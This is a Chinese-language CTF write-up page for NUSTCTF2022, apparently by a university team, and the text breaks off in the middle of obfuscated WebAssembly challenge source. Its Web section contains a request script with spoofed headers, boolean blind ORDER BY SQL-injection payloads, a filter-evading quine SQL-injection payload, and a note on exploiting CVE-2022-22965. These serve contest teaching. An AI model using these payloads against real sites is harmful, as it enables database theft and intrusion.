<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"c-a-t-nust.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="这里是南京理工大学 C.A.T. 战队举办的 NUSTCTF2022 的 Writeup。">
<meta property="og:type" content="article">
<meta property="og:title" content="NUSTCTF2022">
<meta property="og:url" content="https://c-a-t-nust.github.io/p/44961621.html">
<meta property="og:site_name" content="C.A.T. Team">
<meta property="og:description" content="这里是南京理工大学 C.A.T. 战队举办的 NUSTCTF2022 的 Writeup。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://c-a-t-nust.github.io/images/image1.png">
<meta property="og:image" content="https://c-a-t-nust.github.io/images/image2.png">
<meta property="og:image" content="https://c-a-t-nust.github.io/images/image3.png">
<meta property="og:image" content="https://c-a-t-nust.github.io/images/image4.png">
<meta property="article:published_time" content="2022-11-13T04:00:00.000Z">
<meta property="article:modified_time" content="2024-09-14T11:03:10.621Z">
<meta property="article:author" content="C.A.T.">
<meta property="article:tag" content="NUSTCTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://c-a-t-nust.github.io/images/image1.png">


<link rel="canonical" href="https://c-a-t-nust.github.io/p/44961621.html">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://c-a-t-nust.github.io/p/44961621.html","path":"p/44961621.html","title":"NUSTCTF2022"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>NUSTCTF2022 | C.A.T. Team</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">C.A.T. Team</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezProtocol"><span class="nav-number">1.1.</span> <span class="nav-text">ezProtocol</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ezsql"><span class="nav-number">1.2.</span> <span class="nav-text">Ezsql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ezjava1-Ezjava2"><span class="nav-number">1.3.</span> <span class="nav-text">Ezjava1&#x2F;Ezjava2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Translate"><span class="nav-number">1.4.</span> <span class="nav-text">Translate</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Re"><span class="nav-number">2.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezPy"><span class="nav-number">2.1.</span> <span class="nav-text">ezPy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#type"><span class="nav-number">2.2.</span> <span class="nav-text">type</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#order"><span class="nav-number">2.3.</span> <span class="nav-text">order</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Heaven%E2%80%99s-Gate"><span class="nav-number">2.4.</span> <span class="nav-text">Heaven’s Gate</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-number">3.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezPwn"><span class="nav-number">3.1.</span> <span class="nav-text">ezPwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#queue"><span class="nav-number">3.2.</span> <span class="nav-text">queue</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#queue2"><span class="nav-number">3.3.</span> <span class="nav-text">queue2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dinner-text"><span class="nav-number">3.4.</span> <span class="nav-text">dinner_text</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#equiv"><span class="nav-number">4.1.</span> <span class="nav-text">equiv</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezRSA"><span class="nav-number">4.2.</span> <span class="nav-text">ezRSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leakDES"><span class="nav-number">4.3.</span> <span class="nav-text">leakDES</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lattice"><span class="nav-number">4.4.</span> <span class="nav-text">lattice</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">5.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-txt"><span class="nav-number">5.1.</span> <span class="nav-text">ez_txt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ezai"><span class="nav-number">5.2.</span> <span class="nav-text">Ezai</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Empty-maze"><span class="nav-number">5.3.</span> <span class="nav-text">Empty_maze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Puzzle"><span class="nav-number">5.4.</span> <span class="nav-text">Puzzle</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">C.A.T.</p>
  <div class="site-description" itemprop="description">C.A.T. Team</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">3</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://c-a-t-nust.github.io/p/44961621.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="C.A.T.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="C.A.T. Team">
      <meta itemprop="description" content="C.A.T. Team">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="NUSTCTF2022 | C.A.T. Team">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          NUSTCTF2022
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-11-13 星期日 12:00:00" itemprop="dateCreated datePublished" datetime="2022-11-13T12:00:00+08:00">2022-11-13 星期日</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-09-14 星期六 19:03:10" itemprop="dateModified" datetime="2024-09-14T19:03:10+08:00">2024-09-14 星期六</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>这里是南京理工大学 C.A.T. 战队举办的 NUSTCTF2022 的 Writeup。</p>
<span id="more"></span>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezProtocol"><a href="#ezProtocol" class="headerlink" title="ezProtocol"></a>ezProtocol</h2><p>签到题，都是最基础的trick。</p>
<p>对于初学者唯一可能有的难点就是md5强类型比较，出题人还特意选用php8.0来去除字符串函数传数组参数的可能。</p>
<p>一些碰撞：<a target="_blank" rel="noopener" href="https://github.com/corkami/collisions">https://github.com/corkami/collisions</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://43.143.7.97:28991/&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">b = <span class="built_in">open</span>(<span class="string">&#x27;2.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">data[<span class="string">&#x27;p1&#x27;</span>] = a</span><br><span class="line">data[<span class="string">&#x27;p2&#x27;</span>] = b</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://localhost/&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;dinner&#x27;</span>: <span class="string">&#x27;big meal&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, data=data, headers=headers, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text) </span><br></pre></td></tr></table></figure>

<h2 id="Ezsql"><a href="#Ezsql" class="headerlink" title="Ezsql"></a>Ezsql</h2><p>考点：order by 注入</p>
<p>这是我在实际漏洞挖掘中遇到的web利用方式，而且是非常常见的漏洞</p>
<p>一般这种漏洞有个比较明显的特征，传参为desc或asc</p>
<p>其实这是mysql中的排序关键词，用来代表正序和反序</p>
<p>如：<code>select * from position order by id desc;</code></p>
<p>题目里就使用了<code>$sql = &quot;SELECT id AS id, name AS name, position AS position FROM position where id!=3 order by 3 &quot;.$sort;</code>,其中<code>$sort</code>就是传参，这里对<code>$sort</code>进行了一些处理，使其无法进行联合查询和堆叠注入的操作。</p>
<p>题目一开始给出传参：<code>http://47.103.60.98/index.php?sort=desc</code><br>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id: 2 - 姓名: Bob - 籍贯: 江苏无锡</span><br><span class="line">id: 4 - 姓名: Tom - 籍贯: 江苏常州</span><br><span class="line">id: 1 - 姓名: Alice - 籍贯: 江苏南京</span><br><span class="line">id: 5 - 姓名: Mary - 籍贯: 江苏南京</span><br><span class="line">id: 6 - 姓名: Allen - 籍贯: 江苏南京</span><br></pre></td></tr></table></figure>

<p>当改成<code>http://47.103.60.98/index.php?sort=asc</code>时</p>
<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id: 1 - 姓名: Alice - 籍贯: 江苏南京</span><br><span class="line">id: 5 - 姓名: Mary - 籍贯: 江苏南京</span><br><span class="line">id: 6 - 姓名: Allen - 籍贯: 江苏南京</span><br><span class="line">id: 4 - 姓名: Tom - 籍贯: 江苏常州</span><br><span class="line">id: 2 - 姓名: Bob - 籍贯: 江苏无锡</span><br></pre></td></tr></table></figure>

<p>这里我们就可以利用这种差异来进行布尔盲注</p>
<p>利用逗号，我们可以使用rand函数</p>
<p>会发现<code>?sort=desc,rand(0)</code>和<code>?sort=asc,rand(1)</code>输出是不一样的，这样的话只要把rand()的内容换成if函数，就可以实现布尔盲注</p>
<p>如：<code>?sort=asc,rand(if(ascii(left((select table_name from information_schema.tables where table_schema=&#39;xxx&#39;),2)),0,1))</code></p>
<h2 id="Ezjava1-Ezjava2"><a href="#Ezjava1-Ezjava2" class="headerlink" title="Ezjava1&#x2F;Ezjava2"></a>Ezjava1&#x2F;Ezjava2</h2><p>博客里有分析：<a target="_blank" rel="noopener" href="https://ouroborosscr.github.io/2022/04/24/CVE-2022-22965%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%8A%80%E6%9C%AF%E6%A0%88-%E5%88%A9%E7%94%A8%E9%93%BE%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">https://ouroborosscr.github.io/2022/04/24/CVE-2022-22965%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%8A%80%E6%9C%AF%E6%A0%88-%E5%88%A9%E7%94%A8%E9%93%BE%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</a></p>
<p>一个是Javabeans的用法：类似：<code>/addUser?name=test&amp;department.name1=SEC</code><br>另一个是<code>CVE-2022-22965</code>任意文件上传漏洞的利用，只不过这里数据包传参因为版本问题会有瑕疵，不太好控制文件内容，我只对文件的文件名进行了一些测试，就放出flag了</p>
<h2 id="Translate"><a href="#Translate" class="headerlink" title="Translate"></a>Translate</h2><p>这道题的灵感来自于第五空间CTF的yet_another_mysql_injection和2021qwb Quals easy_sql </p>
<p>主要考点就是quine注入，然后又加了一个伪协议读取部分源码，过滤了常用的伪协议，可以用iconv读。而为什么叫translate，是因为一开始的难点是用的pgsql数据库中的translate函数来代替最终payload中的部分replace函数。但是由于一些原因最终还是换成了mysql数据库。</p>
<p>最终payload：</p>
<p><code>1&#39;/**/union/**/select/**/REPLACE(replace(&#39;1&quot;/**/union/**/select/**/REPLACE(replace(&quot;.&quot;,0x22,0x27),0x2e,&quot;.&quot;)#&#39;,0x22,0x27),0x2e,&#39;1&quot;/**/union/**/select/**/REPLACE(replace(&quot;.&quot;,0x22,0x27),0x2e,&quot;.&quot;)#&#39;)# </code><br>过滤了char()，用十六进制代替。限制了replace的使用次数最多为三次，大小写可以绕过。</p>
<p>至于payload的构造，可以参考这篇文章  <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253570#h3-8">从三道赛题再谈Quine trick</a></p>
<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="ezPy"><a href="#ezPy" class="headerlink" title="ezPy"></a>ezPy</h2><p>签到题，用 pyinstxtractor 解压后扔到<a target="_blank" rel="noopener" href="https://tool.lu/pyc/">在线网站</a>都能出。</p>
<h2 id="type"><a href="#type" class="headerlink" title="type"></a>type</h2><p>wasm逆向</p>
<p>源代码手写了一段简单的控制流混淆</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emscripten.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">    EMSCRIPTEN_KEEPALIVE</span><br><span class="line">    <span class="type">bool</span> <span class="title function_">encode</span><span class="params">(<span class="type">char</span>* aofnasv16x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> cc9a49a2x = <span class="number">0</span>, xz6zx14494 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> a16_x46ae = <span class="number">0x76249232</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (a16_x46ae &lt; <span class="number">0x63456f54</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (a16_x46ae &lt; <span class="number">0x571daa62</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (a16_x46ae &lt; <span class="number">0x5297862a</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (a16_x46ae &lt; <span class="number">0x49fc2261</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (a16_x46ae &lt; <span class="number">0x43e19c92</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (a16_x46ae &lt; <span class="number">0x37c6ef55</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (a16_x46ae &lt; <span class="number">0x34a9427e</span>) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (a16_x46ae &lt; <span class="number">0x30123aa5</span>) &#123;</span><br><span class="line">                                            <span class="keyword">if</span> (a16_x46ae &lt; <span class="number">0x27999999</span>) &#123;</span><br><span class="line">                                                <span class="keyword">if</span> (a16_x46ae &lt; <span class="number">0x2297ab23</span>) &#123;</span><br><span class="line">                                                    <span class="keyword">if</span> (a16_x46ae &lt; <span class="number">0x1756ef12</span>) &#123;</span><br><span class="line">                                                        <span class="comment">//16</span></span><br><span class="line">                                                        <span class="type">unsigned</span> <span class="type">int</span> zxccz849 = <span class="number">0x4790d5f4</span>, g9gd79s = <span class="number">0x2517d40e</span>, zppzxo52 = <span class="number">0x20ac49e6</span>;</span><br><span class="line">                                                        <span class="keyword">if</span> (cc9a49a2x % <span class="number">3</span>) &#123;</span><br><span class="line">                                                            <span class="keyword">if</span> (cc9a49a2x % <span class="number">2</span>) &#123;</span><br><span class="line">                                                                a16_x46ae ^= zxccz849;</span><br><span class="line">                                                            &#125;</span><br><span class="line">                                                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                                                a16_x46ae ^= g9gd79s;</span><br><span class="line">                                                            &#125;</span><br><span class="line">                                                        &#125;</span><br><span class="line">                                                        <span class="keyword">else</span> &#123;</span><br><span class="line">                                                            a16_x46ae ^= zppzxo52;</span><br><span class="line">                                                        &#125;</span><br><span class="line">                                                    &#125;</span><br><span class="line">                                                    <span class="keyword">else</span> &#123;</span><br><span class="line">                                                        <span class="comment">//20</span></span><br><span class="line">                                                        cc9a49a2x++;</span><br><span class="line">                                                        a16_x46ae ^= <span class="number">0x657aa752</span>;</span><br><span class="line">                                                    &#125;</span><br><span class="line">                                                &#125;</span><br><span class="line">                                                <span class="keyword">else</span> &#123;</span><br><span class="line">                                                    <span class="comment">//25</span></span><br><span class="line">                                                    xz6zx14494 = xz6zx14494 % <span class="number">39</span>;</span><br><span class="line">                                                    a16_x46ae ^= <span class="number">0x331b192b</span>;</span><br><span class="line">                                                &#125;</span><br><span class="line">                                            &#125;</span><br><span class="line">                                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                                <span class="comment">//29</span></span><br><span class="line">                                                aofnasv16x[cc9a49a2x] ^= aofnasv16x[xz6zx14494];</span><br><span class="line">                                                a16_x46ae ^= <span class="number">0x09cdef12</span>;</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        <span class="keyword">else</span> &#123;</span><br><span class="line">                                            <span class="comment">//33</span></span><br><span class="line">                                            <span class="type">int</span> jvbos56 = <span class="number">0x1ad5036e</span>, wof843zx = <span class="number">0x52dffaa3</span>;</span><br><span class="line">                                            <span class="keyword">if</span> (cc9a49a2x % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">                                                a16_x46ae ^= jvbos56;</span><br><span class="line">                                            &#125;</span><br><span class="line">                                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                                a16_x46ae ^= wof843zx;</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="comment">//36</span></span><br><span class="line">                                        aofnasv16x[cc9a49a2x] += aofnasv16x[xz6zx14494];</span><br><span class="line">                                        a16_x46ae ^= <span class="number">0x167a9f35</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="comment">//40</span></span><br><span class="line">                                    xz6zx14494 ^= <span class="number">5</span>;</span><br><span class="line">                                    a16_x46ae ^= <span class="number">0x65ae2294</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="comment">//45</span></span><br><span class="line">                                <span class="type">int</span> shocx6549 = <span class="number">0x139af590</span>, gowhs98 = <span class="number">0x33195ad6</span>;</span><br><span class="line">                                <span class="keyword">if</span> (cc9a49a2x == <span class="number">39</span>) &#123;</span><br><span class="line">                                    a16_x46ae ^= shocx6549;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">else</span> &#123;</span><br><span class="line">                                    a16_x46ae ^= gowhs98;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">//51</span></span><br><span class="line">                            <span class="type">int</span> paz64984 = <span class="number">0x3019417c</span>, vnonzx984 = <span class="number">0x7890e664</span>;</span><br><span class="line">                            <span class="keyword">if</span> (cc9a49a2x % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                                a16_x46ae ^= paz64984;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                a16_x46ae ^= vnonzx984;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">//56</span></span><br><span class="line">                        <span class="keyword">break</span>;<span class="comment">//end</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//61</span></span><br><span class="line">                    aofnasv16x[cc9a49a2x] -= aofnasv16x[xz6zx14494];</span><br><span class="line">                    a16_x46ae ^= <span class="number">0x4149ac56</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//76</span></span><br><span class="line">                xz6zx14494 += <span class="number">12</span>;</span><br><span class="line">                a16_x46ae ^= <span class="number">0x366d344f</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">        <span class="type">char</span> z9v49s[] = &#123; <span class="number">0xda</span>,<span class="number">0xf8</span>,<span class="number">0x12</span>,<span class="number">0xd5</span>,<span class="number">0x69</span>,<span class="number">0xd</span>,<span class="number">0x8f</span>,<span class="number">0x37</span>,<span class="number">0x46</span>,<span class="number">0xdd</span>,<span class="number">0x44</span>,<span class="number">0x1f</span>,<span class="number">0xc7</span>,<span class="number">0x2e</span>,<span class="number">0x55</span>,<span class="number">0x93</span>,<span class="number">0x9a</span>,<span class="number">0x82</span>,<span class="number">0xca</span>,<span class="number">0xf3</span>,<span class="number">0x31</span>,<span class="number">0x42</span>,<span class="number">0x43</span>,<span class="number">0xac</span>,<span class="number">0xaa</span>,<span class="number">0xfc</span>,<span class="number">0xa</span>,<span class="number">0x77</span>,<span class="number">0x1</span>,<span class="number">0x61</span>,<span class="number">0x90</span>,<span class="number">0xfa</span>,<span class="number">0x2d</span>,<span class="number">0x39</span>,<span class="number">0x9a</span>,<span class="number">0xaf</span>,<span class="number">0x6f</span>,<span class="number">0x40</span>,<span class="number">0x6f</span> &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">39</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (z9v49s[i] != aofnasv16x[i])<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        